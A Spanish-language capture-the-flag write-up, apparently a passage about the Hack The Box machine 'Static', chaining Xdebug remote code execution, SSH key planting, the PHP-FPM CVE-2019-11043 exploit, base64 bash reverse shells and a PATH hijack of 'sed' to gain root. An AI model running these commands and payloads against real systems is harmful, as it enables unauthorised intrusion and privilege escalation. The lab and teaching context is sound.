<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page80phpinfo_listDirectory.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Apaaaa, tenemos un recurso distinto al primer servidor web (`/vpn/` es el mismo que antes (el login-panel)), `info.php`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page80phpinfo_infoPHP.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Hay muuuuuuuuuuchas versiones y referencias locas.

Despu√©s de vaaaaarias b√∫squedas y perdidas, llegamos a una extensi√≥n de `PHP` que esta siendo usada por la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page80phpinfo_infoPHP_xdebugVersion.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Lo curioso es que en la web de una encontramos cositas interesantes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355google_xdebug_foundExploit.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

* [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

üí¢ ***Extensi√≥n de PHP que proporciona la <u>capacidad de depurar c√≥digo y errores</u>***. [Xdebug](https://es.wikipedia.org/wiki/Xdebug)

Buscando, nos damos cuenta de que existen varios vectores de ataque contra `xdebug` **asociados** a [phpstorm](https://www.jetbrains.com/es-es/phpstorm/), que es un **entorno de desarrollo integrado (IDE)** para `PHP`.

* [The Exploits of Xdebug in PhpStorm](https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc).
* [Xdebug: A Tiny Attack Surface](https://paper.seebug.org/397/).

Uno de ellos (y el que vemos en el exploit de GitHub) es basado en la funci√≥n [eval](https://www.php.net/manual/es/function.eval.php) de `PHP`, ya que permite ejecuci√≥n remota de comandos üòà

El tema es que `PHPStorm` crea los procesos para empezar a debuggear, peeeero tambi√©n hace que los puertos `9000` (tambi√©n lo vemos en el exploit de GitHub), **10137** y **20080** est√©n en escucha esperando una conexi√≥n. Despu√©s para generar esa conexi√≥n y empezar a debuggear, debemos usar `XDEBUG_SESSION=PHPSTORM`. Esto finalmente hace que `xdebug` se conecte al puerto `9000` donde previamente `PHPStorm` estaba escuchando y pues ya tendr√≠amos acceso a todas las funcionalidades de un debug, que en este caso junto a la funci√≥n `eval` seria obtener un **RCE** bien lindo.

Los pasos para la explotaci√≥n serian estos:

* Ejecutamos exploit, √©l genera la escucha sobre el puerto `9000`.
* Hacemos la petici√≥n para crear la conexi√≥n:

  ```bash
  ‚ù± curl http://172.20.0.10/info.php?XDEBUG_SESSION_START=phpstorm
  ```

* Esa petici√≥n establece la conexi√≥n con el puerto `9000` y ya se nos mostrar√≠a una FakeShell en la que si queremos ejecutar comandos debemos hacer:

  ```php
  >> system("<comando>");  // U otras maneras (exec, shell_exec...)
  ```

Decid√≠ implementarle varias cosas al script para generar todos los pasos desde √©l, as√≠ lo √∫nico que debemos hacer es ejecutarlo y ya obtendr√≠amos la **FakeShell**, este ser√≠a el resultado:

> [xdebug_rce.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/static/xdebug_rce.py)

```bash
‚ù± python3 xdebug_rce.py 

FakeShell (RCE) explotando extensi√≥n XDebug 2.6.0 en PHP

xdeBUG ~> whoami
www-data
xdeBUG ~> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
xdeBUG ~> pwd
/var/www/html
```

Pues muy bien, ahora solo nos queda buscar alguna manera de obtener una `reverse shell` o algo llamativo por ah√≠ (:

## Encontramos llaves <u>SSH</u> del usuario <u>www-data</u> [üìå](#www-web-ssh) {#www-web-ssh}

Algo que nos damos cuenta es que al intentar listar o leer archivos nos devuelve un solo resultado de toooodos los que deber√≠an venir, por ejemplo si queremos ver el contenido del archivo `/etc/passwd`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_xdebugPY_catEtcPasswd_fail.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Claramente, no puede ser de un resultado o podr√≠a, pero ese resultado deber√≠amos ser nosotros, `www-data`, as√≠ que intuimos que nos esta cortando la respuesta, esto lo podemos **"solucionar"** (a veces sirve, otras no) dici√©ndole que al resultado le quite los saltos de l√≠nea, no funciono contra ese archivo pero si contra directorios:

```bash
xdeBUG ~> ls -la /home
drwxr-x--- 4 www-data www-data 4096 Sep 29 12:14 www-data
xdeBUG ~> ls -la /home/www-data
-rw-rw-r-- 1 www-data www-data   53 Sep 29 11:31 index.html
xdeBUG ~> ls -la /home/www-data | xargs echo
total 20 drwxr-x--- 4 www-data www-data 4096 Sep 29 16:10 . drwxr-xr-x 3 root root 4096 Jun 14 07:56 .. lrwxrwxrwx 1 root root 9 Jun 14 08:02 .bash_history -> /dev/null drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh -rw-rw-r-- 1 www-data www-data 53 Sep 29 11:31 index.html
```

Entre lo que obtenemos, vemos una carpeta llamativa: `.ssh`, inspeccion√©mosla...

```bash
xdeBUG ~> ls -la /home/www-data/.ssh | xargs echo
total 20 drwx------ 2 www-data www-data 4096 Jun 14 07:54 . drwxr-x--- 4 www-data www-data 4096 Sep 29 16:10 .. -rw-r--r-- 1 www-data www-data 390 Jun 14 07:54 authorized_keys -rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa -rw-r--r-- 1 www-data www-data 390 Jun 14 07:34 id_rsa.pub
```

Bien, tenemos una llave privada, una p√∫blica y el archivo donde residen las llaves p√∫blicas de otros usuarios que quieren conectarse a la m√°quina sin proveer contrase√±a :O Intentemos extraer la llave privada de `www-data` y si no lo logramos, agregamos nuestra llave p√∫blica al archivo `authorized_keys` para que el sistema nos deje autenticarnos sin proveer contrase√±a.

```bash
xdeBUG ~> cat /home/www-data/.ssh/id_rsa
-----END RSA PRIVATE KEY-----
```

Nos devuelve √∫nicamente la √∫ltima l√≠nea del archivo... Intentando otras formas, nanai, as√≠ que agreguemos nuestra llave publica a `authorized_keys`:

```bash
‚ù± ssh-keygen
```

Nos genera el par de llaves (si ya las tienes pues no las creas :P), vamos a la ruta donde se hayan creado y tomamos el objeto `id_rsa.pub`, copiamos su contenido yyyyyyyyy en la **Fake Shell** le decimos que remplace el contenido del archivo con la nueva cadena que le pasaremos, o sea con nuestra llave publica:

* [Comando Tee de Linux con ejemplos](https://www.hostinger.co/tutoriales/comando-tee-linux-con-ejemplos).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_xdebugPY_teeIDrsaPUB_lanz.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Perfecto, pues ya lo siguiente ser√≠a simplemente intentar conectarnos por `SSH` a la m√°quina como `www-data`, no deber√≠a pedirnos contrase√±a, ya que el sistema conf√≠a en las credenciales que encuentra en el objeto `authorized_keys`, veamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataWEB_SH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

PERFECTOOOOOOOOOOOOOOOOO!! Tenemos una Shell estable, para evitar estar modificando el objeto `authorized_keys`, tomemos la llave privada y guard√©mosla, si en dado caso se borra nuestra llave p√∫blica, usar√≠amos algo como:

```bash
‚ù± ssh www-data@172.20.0.10 -i www-data.privkey
```

Bueno, pues a enumerar...

...

# www-data (web) -> www-data (pki) [#](#www-data-pki) {#www-data-pki}

Algo que me di cuenta al tomar el screen de arriba es que nuestra IP privada esta en el segmento de una los servidores que vimos antes en la web:

```html
pki    192.168.254.3    Online
```

Jmmm, interesante, pero **¬øqu√© es PKI?** (io no sabo):

üîë ***Una <u>infraestructura de claves p√∫blicas (PKI)</u>, son un grupo de componentes y servicios inform√°ticos que permiten gestionar, controlar y administrar la tarea de generar, brindar, revocar y validar toda clase de certificados digitales.*** [Infraestructura de clave p√∫blica o PKI](https://www.docusign.mx/blog/pki)

Listones, certificados digitales nos lleva a pensar en servidores web, pero para evitar adivinar podemos hacer uso del script con el que encontramos las direcciones y puertos activos, pas√©moslo al sistema:

```bash
‚ù± base64 -w 0 tryWITHips.sh
# Copiamos el output
www-data@web:~$ echo "<base64>" | base64 -d > /tmp/tryWITHips.sh
```

Y listo, probemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataWEB_SH_discoverIPSandPORTS.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Efectivamente, la direcci√≥n `192.168.254.3` esta ejecutando un servidor web, pero tamos medio F, ya que el sistema no tiene ni `cURL` ni `wget` para interactuar con √©l. Ac√° record√© que una vez us√© una funci√≥n que alguien creo la cual simula una conexi√≥n `tcp` para descargar archivos y hacer peticiones a servicios web. Casi no la encuentro, peeeeeroooooo:

* [How to download a file using just bash and nothing else (no curl, wget, perl, etc.)](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et#answer-421318).

Entonces, copiamos exactamente la funci√≥n como esta y la pegamos en la terminal, el resultado es que podemos emular el uso de `curl` con `__curl`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataWEB_SH_function__curl.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Jmmm, un output bastante extra√±o, nos muestra una ruta hacia un binario, pero en el sistema no existe:

```bash
www-data@web:/tmp$ ls -al /usr/bin/ersatool
ls: cannot access '/usr/bin/ersatool': No such file or directory
```

Despu√©s de estar bastante perdido, decid√≠ hacer un **port forwarding** y ver si existen algunas rutas que est√© sirviendo fuera de nuestros ojos (fuzzing), apoyados en que tenemos "credenciales" es muuucho m√°s f√°cil el fortwarding:

```bash
‚ù± ssh www-data@172.20.0.10 -i www-data.privkey -L 8001:192.168.254.3:80
```

Le decimos que redireccione el tr√°fico del puerto `80` del servidor `192.168.254.3` al puerto `8001` de nuestro sistema local, validamos:

```bash
‚ù± lsof -i:8001
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ssh     294594 root    4u  IPv6 1117044      0t0  TCP localhost:8001 (LISTEN)
ssh     294594 root    5u  IPv4 1117045      0t0  TCP localhost:8001 (LISTEN)
```

Listo, en la web vemos lo mismo de antes (la referencia al binario), intentando `fuzzing` tampoco difiere la respuesta, as√≠ que a seguir buscando...

Visualizando como viaja la petici√≥n `GET` vemos algo bastante llamativo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8001localhost_referencePHP-FPM.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Jmmm, ¬ø`PHP-FPM`? Veamos que es eso r√°pidamente:

üåæ ***`PHP-FPM` (Fast Process Manager) sirve para que el c√≥digo `PHP` ejecutado en un servidor no sea tomado como un solo proceso, sino que se pueda repartir, controlar, ejecutar, etc. en varios.*** [üîó](https://geekflare.com/php-fpm-optimization/)

Bien, pues veamos si existen vulnerabilidades para la version `7.1`... 

## RCEnizas contra <u>PHP-FPM 7.1</u> [üìå](#php-fpm) {#php-fpm}

Y sip, hay una que se repite bastante:

* [CVE-2019-11043](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11043).

> *In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, <u>thus opening the possibility of remote code execution</u>.*

Opaaa. Tenemos varios recursos que la explican, se los dejo para que profundicen:

* [(CVE-2019-11043) PHP-FPM & NGINX RCE](https://blog.detectify.com/2019/10/31/cve-2019-11043-nginx-php-fpm-exploit/).
* [RCE Vulnerability Exploited in-the-wild (CVE-2019-11043)](https://www.secpod.com/blog/php-rce-exploited-in-the-wild-cve-2019-11043/).
* [(CVE-2019-11043) can lead RCE in NGINX Web Servers](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/php-fpm-vulnerability-cve-2019-11043-can-lead-to-remote-code-execution-in-nginx-web-servers).
* [PHP-FPM : Remote Code Execution (CVE-2019-11043)](https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043).

B√°sicamente la explotaci√≥n se logra bypasseando una configuraci√≥n espec√≠fica. Esta configuraci√≥n esta basada en expresiones regulares que pueden ser burladas al agregar una nueva l√≠nea encodeada (`%0a`), esta l√≠nea y otros caracteres loooooooocos permitir√°n sobreescribir variables. Una de esas variables puede conceder un lujo, ese lujo se llama <u>acceso a ejecuci√≥n remota de comandos</u> üòú Realmente el trasfondo de la vuln es una locura, as√≠ que √©chenle un ojo a los recursos de arriba (:

(As√≠ que nos qued√≥ perfecto el fortwarding, de igual forma √≠bamos a hacerlo :P)

Encontramos este **PoC** que automatiza toda la vaina:

* [https://github.com/neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam)

Adem√°s, el creador tambi√©n nos da una explicaci√≥n bastante fresca sobre la vuln y porque se causa yyyy claramente como la explot√≥.

Nos clonamos el repo y ejecutamos:

```bash
‚ù± go build
```

Deber√≠amos obtener el binario:

```bash
‚ù± ls
phuip-fpizdam
```

Y su uso es muy sencillo, √∫nicamente le debemos pasar la URL donde esta `FPM` sirviendo:

```bash
‚ù± ./phuip-fpizdam http://127.0.0.1:8001
2021/09/29 18:18:19 Failed to create requester: well I believe the url must end with ".php". Maybe I'm wrong, delete this check if you feel like it
```

Necesita un `.php`, validemos si existe `index.php`:

```bash
‚ù± curl http://127.0.0.1:8001/index.php
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Perfecto, pues us√©moslo:

```bash
‚ù± ./phuip-fpizdam http://127.0.0.1:8001/index.php
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_phuipGO_FPMpoisoned.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Bien, ahora que ha sido sobreescrito toooooodo e.e Podremos intentar ejecuci√≥n remota de comandos como nos indica:

```bash
Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
```

Algo que nos indica el creador es que a veces hay que enviar varias veces la petici√≥n para lograr el **RCE**, si vemos que es muy random nos automatizamos el proceso para que haga los intentos el mismo programa y nosotros √∫nicamente obtengamos los resultados...

Por ejemplo, intentemos ejecutar `id`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355page8001localhost_RCEid.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Despu√©s de unos 3-4 intentos obtenemos el resultado del comando, as√≠ que tamos perfectoooooooooooos, tenemos ejecuci√≥n remota de comandos contra el servidor `pki` (:

Intentando alguna que otra **Reverse Shell** no logramos nada y enumerar desde la web es medio feito, as√≠ que procedemos con la automatizaci√≥n antes mencionada, este ser√≠a el resultado:

> [phpFpmRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/static/phpFpmRCE.py)

Con √©l generamos una **FakeShell** to linda:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_fpmPY_fakeShellDONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ahora que estamos m√°s c√≥modos, busquemos una manera de obtener una reverse shell...

Si recordamos sabemos que tenemos acceso remoto a otra direcci√≥n que esta m√°quina reconoce, la `192.168.254.2` (nosotros somos la `.3` (pki)), pues podr√≠amos intentar establecer la reverse Shell contra ese recurso, la cosita es que la `.2` no tiene `nc`, pero podemos subirlo y ponernos en escucha:

```bash
www-data@web:/tmp$ mkdir test
```

```bash
‚ù± which nc
/usr/bin/nc
‚ù± cp /usr/bin/nc .
```

Levantamos servidor web y con ayuda de `__curl` subimos el binario:

```bash
www-data@web:/tmp/test$ __curl http://10.10.14.79:8000/nc > nc
-bash: connect: Connection refused
-bash: /dev/tcp/10.10.14.79/8000: Connection refused
...
```

Pero pailas, no tenemos conectividad contra nuestra IP externa, esa es la raz√≥n tambi√©n del porqu√© no podemos establecer la Reverse Shell...

Pues hagamos la cl√°sica, tomamos el contenido del binario en formato `base64` y lo pasamos al objetivo para posteriormente decodearlo y volver al contenido original:

```bash
‚ù± base64 -w 0 nc
```

Copiamos el output y en la `.2` ejecutamos:

```bash
www-data@web:/tmp/test$ echo "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAsDAAAAAA
...
...
...
BAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA" | base64 -d > nc
```

Validamos integridad:

```bash
‚ù± md5sum nc
7e6f1531bbae64b64630bad39c9bab5e  nc
```

```bash
www-data@web:/tmp/test$ md5sum nc 
7e6f1531bbae64b64630bad39c9bab5e  nc
```

Listos, pues ahora s√≠, pong√°monos en escucha y generemos la p**** Shell :P

```bash
www-data@web:/tmp/test$ chmod +x nc 
www-data@web:/tmp/test$ hostname -I
172.20.0.10 192.168.254.2
www-data@web:/tmp/test$ ./nc -lvp 4433
listening on [any] 4433 ...
```

Para evitarnos problemitas hacemos esto:

```bash
‚ù± echo "bash -i >& /dev/tcp/192.168.254.2/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4yLzQ0MzMgMD4mMQo=
```

Tomamos la cadena y en la m√°quina `.3` ejecutamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_fpmPY_revSHto2.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Yyyyyy en la `.2`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataPKI_revSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

VAMOOOOOOOOOOOOOOOOOOOOOOOOOO, ahora siiiiiiiiiiiiiii, tenemos una Reverse Shell en la m√°quina `192.168.254.3`, per fec to.

...

Antes de seguir hag√°mosle un masaje a la Shell para que quede incre√≠ble:

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

(Ahora si ta guapetona, sigamos)

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando las capabilities (peque√±as instrucciones con permisos administrativos) y los procesos que las tengan, llegamos de nuevo al binario `/usr/bin/ersatool`:

```bash
www-data@pki:~/html$ getcap -r / 2>/dev/null
/usr/bin/ersatool = cap_setuid+eip
```

En este caso el binario cuenta con el privilegio de cambiar el usuario que lo ejecuta (UID : User Identifier), por lo que si encontramos la forma, podremos indicarle que en vez de `www-data` sea `root` el que lo ejecute, sigamos explorando sobre √©l...

Podemos movernos el binario a nuestra m√°quina y jugar con `ltrace` o `strace` o incluso intentar cositas de `reversing`, hay l√≠neas interesantes pero nada relevante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_strace_ersatool.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Bien, con este peque√±o intento de ver que pasa por detr√°s del binario tenemos una ruta nueva `/opt/easyrsa` y toma sentido la capability que hab√≠amos encontrado antes, ya que el mismo programa la usa para crear e imprimir objetos del sistema.

Revisando la ruta no llegamos a ning√∫n lado, ya que claramente esta restringida :(

```bash
www-data@pki:/opt$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Jun 21 17:03 .
drwxr-xr-x 1 root root 4096 Sep 30 12:56 ..
drwx------ 6 root root 4096 Apr  3  2020 easyrsa
```

```bash
www-data@pki:/opt$ ls -la easyrsa/
ls: cannot open directory 'easyrsa/': Permission denied
```

As√≠ que F. Buscando en internet algo relacionado con `easyrsa` caemos en este repo:

* [https://github.com/OpenVPN/easy-rsa](https://github.com/OpenVPN/easy-rsa)

Es una herramienta que para gestionar todo lo relacionado con los [certificados de autorizaci√≥n (CA)](https://es.wikipedia.org/wiki/Autoridad_de_certificaci%C3%B3n) y permite obtener una Shell sencilla.

Si ejecutamos el binario vemos mucho mejor la Shell y las respuestas:

```bash
www-data@pki:/tmp/test$ /usr/bin/ersatool
# 
create|print|revoke|exit
```

üß∏ **create**:

```bash
# create
create->CN=si
client
dev tun9
proto udp
remote vpn.static.htb 1194
...
```

Y en teor√≠a genera un certificado, ac√° entendemos se generan los que vimos hace rato en la web (`pki`, `pub`, `web`, etc.)

üß∏ **print**:

```bash
# print
print->CN=hola
hola[!] ERR reading /opt/easyrsa/clients/hola.ovpn!
```

Obtenemos la ruta :P

üß∏ **revoke**:

```bash
# revoke
[!] Not implemented
```

Pero poquito podemos hacer con esto...

## Vemos procesos internos con <u>/usr/bin/ersatool</u> [üìå](#pspy-ersatool) {#pspy-ersatool}

Ahora que tenemos un binario funcional, pero con el cual no hemos hecho un claro an√°lisis din√°mico, que seria entender o al menos ver que hace por detr√°s (antes del est√°tico, o sea **reversing**). Para intentarlo podemos apoyarnos de [pspy](https://github.com/DominicBreuker/pspy), que b√°sicamente es todo lo que queremos hacer, monitorear procesos internos que sucedan en el sistema, lo aprovecharemos para una vez ejecutemos `/usr/bin/ersatool` ver como se comporta el sistema.

Nos descargamos el binario de ac√°:

* [https://github.com/DominicBreuker/pspy/releases](https://github.com/DominicBreuker/pspy/releases)

<span style="color:yellow;">Para facilitarnos la vida y el writeup hablaremos de ahora en adelante as√≠ con respecto a los hosts</span>:

| Nombre original | Nombre m√°s f√°cil |
| --------------- | :--------------- |
| 192.168.254.2 - web | .2 |
| 192.168.254.3 - pki | .3 |

El proceso de transferir el binario de mi m√°quina a la `.3` me hizo perder la terminal un par de veces :P As√≠ que me fui a buscar alternativas, encontr√© [este post](https://devconnected.com/4-ways-to-transfer-files-and-directories-on-linux/) con esta opci√≥n:

> **Recordemos que la `.3` solo tiene conectividad con la `.2`. Lo mejor fue pasar el archivo a la `.2` y desde la `.3` hablar con la `.2` para que nos preste el binario.**

```bash
scp <option> <source_user>@<source_host>:<file> <destination_user>@<destination_host>:<file>
scp <source_file> <user>@<hostname>:<dest_file>
```

Con `scp` tambi√©n podemos usar la llave de identificaci√≥n (si no tendr√≠amos que modificar de nuevo el archivo `authorized_keys`), adecuando todo nos quedar√≠a as√≠:

```bash
‚ù± scp -i www-data.privkey pspy www-data@172.20.0.10:/tmp/test/pspy
```

Le damos candela:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_scp_pspy.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Yyy:

```bash
www-data@web:/tmp/test$ ls -la
...
-rwxr-xr-x 1 www-data www-data 1156536 Sep 30 25:25 pspy
```

Ahora es mucho m√°s f√°cil la transferencia, desde la `.3` usamos `__curl` y guardamos el archivo.

En la `.2` nos ponemos en escucha, afortunadamente tiene `Python` instalado :P

```bash
www-data@web:/tmp/test$ which python3
/usr/bin/python3
www-data@web:/tmp/test$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y en la `.3`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataPKI___curlPSPY.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Lisssssstones, podemos pensar que necesitamos otra terminal para ejecutar la tarea y a la vez ver que pasa por detr√°s, pero noooooooooooooo (adem√°s, que pereza, lo hice, pero la perd√≠ unas veces y aggg), podemos jugar con `timeout` y una tarea en background para ejecutar `pspy` en segundo plano mientras interactuamos con el binario, √∫nicamente debemos guardar una traza de todo lo que pase mientras jugamos, algo as√≠:

* [How to timeout with exit(0) from Bash](https://stackoverflow.com/questions/50382603/how-to-timeout-with-exit0-from-bash).

---

```bash
www-data@pki:/tmp/test$ timeout --preserve-status 2m ./pspy > /tmp/test/locuras.txt &
```

Lanzar√° `./pspy` por 2 minutos en segundo plano (`&`) sin importar si da error o no (`--preserve-status`) yyyyyyy todo lo que pase lo guardara en el archivo `/tmp/test/locuras.txt`, pos veamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataPKI_pspyBACKGROUND.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Interactuamos... Jugamos... Ejecutamos... ETC.

Despu√©s de los 2 minutos, obtendremos esto en la terminal:

```bash
[1]+  Done                    timeout --preserve-status 2m ./pspy > /tmp/test/locuras.txt
```

Y si revisamos el archivo que se iba creando, tenemos:

```bash
www-data@pki:/tmp/test$ ls -la
...
-rw-r--r-- 1 www-data www-data    4523 Sep 30 25:25 locuras.txt
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_www-dataPKI_pspyEXECUTED_possiblyPATHijackin.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

> **Esos resultados son de ejecutar `create` y `print`**

OPAAAAAAAA, hay varias instrucciones ejecutadas por el `UID=0`, ¬øqu√© significa? O sea, que son ejecutadas por el usuario `root` :O (Debe ser al momento de generar el `setuid(0)` que vimos antes con `strace`). 

¬øQu√© ven interesante? üëÄ

Hay 3 l√≠neas bastante llamativas, ya que con las 3 podemos hacer cosas malvadas... ¬øYa sabes de qu√© podemos aprovecharnos o al menos intentarlo?

Efectivamente, el binario en sus procesos llama 3 instrucciones del sistema sin su ruta absoluta:

```bash
... CMD: UID=0    PID=8700   | sed -e ...
... CMD: UID=0    PID=8701   | openssl ...
... CMD: UID=0    PID=8703   | rm ...
```

YYYY son ejecutadas por el usuario `root`, ufff. Pues juguemos, juguemos con los `Path Hijacking`...

## Encontramos posible <u>Path Hijacking</u> [üìå](#ersatool-path-hijacking) {#ersatool-path-hijacking}

No explicare a profundidad los secuestros de ruta, pero un pasabocas seria:

1. Existe una variable de entorno con todas las rutas donde el sistema va a buscar los binarios a ejecutar (`$PATH`).
2. Si el sistema encuentra en alguna de esas rutas el binario, pos lo ejecuta.
3. La explotaci√≥n viene cuando se llama un binario sin su ruta absoluta, o sea la ruta por default de ese objeto.
4. Esto abre la puerta a alguien (nosotros) de crear un archivo que se llame **igual** al binario sin ruta absoluta.
5. Modificar√≠amos nuestra variable de entorno `PATH` agregando una nueva ruta, esa ruta seria donde est√© alojado el archivo que generamos previamente.
6. El binario o proceso que llame al objeto sin ruta absoluta recorrer√° de nuevo tooodas las rutas del `PATH`.
7. Como ya modificamos esa variable y agregamos nuestra ruta **antes** de la original... pueeees...
8. Ejecutar√° el archivo custom, o sea el que creamos nosotros (:

Algunas referencias por si algo:

* [Hijacking Relative Paths in SUID Programs](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e).
* [Linux Privilege Escalation Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

Listos, pues juguemos con la instrucci√≥n `sed`, directamente intentemos obtener una **Reverse Shell**, con todo lo dicho/visto antes, deber√≠amos obtenerla como el usuario `root`:

(Evitamos problemitas)

```bash
www-data@pki:/tmp/test$ echo "bash -i >& /dev/tcp/192.168.254.2/4450 0>&1" | base64   
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4yLzQ0NTAgMD4mMQo=
```

Creamos archivo malicioso:

```bash
www-data@pki:/tmp/test$ echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4yLzQ0NTAgMD4mMQo= | base64 -d | bash' > sed
www-data@pki:/tmp/test$ cat sed 
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4yLzQ0NTAgMD4mMQo= | base64 -d | bash
www-data@pki:/tmp/test$ chmod +x sed
```

Entonces cuando lea este archivo, tomara la cadena, la decodeara y la interpretara (:

Antes de que se nos olvide, nos ponemos en escucha con la m√°quina `.2` sobre el puerto `4450`:

```bash
www-data@web:/tmp/test$ ./nc -lvp 4450
listening on [any] 4450 ...
```

Y en la `.3` finalmente modificamos nuestra variable `PATH`:

```bash
www-data@pki:/tmp/test$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@pki:/tmp/test$ old_path=$PATH  # La guardamos por si algo
www-data@pki:/tmp/test$ export PATH=/tmp/test:$PATH  # Primero la nuestra y le concatenamos la anterior
www-data@pki:/tmp/test$ echo $PATH
/tmp/test:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Perfecto, lo √∫nico que queda es interactuar con el binario y rezarle a diosito para que funcione :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_ersatool_hijackingDONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Se queda pegadoooooooooooooooooooooo yyyyyyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355bash_rootPKI_RevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

VAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO, tamos dentrooooooooo :))))))))

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355google_gif_yeahBEARdance.gif" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 70%;"/>

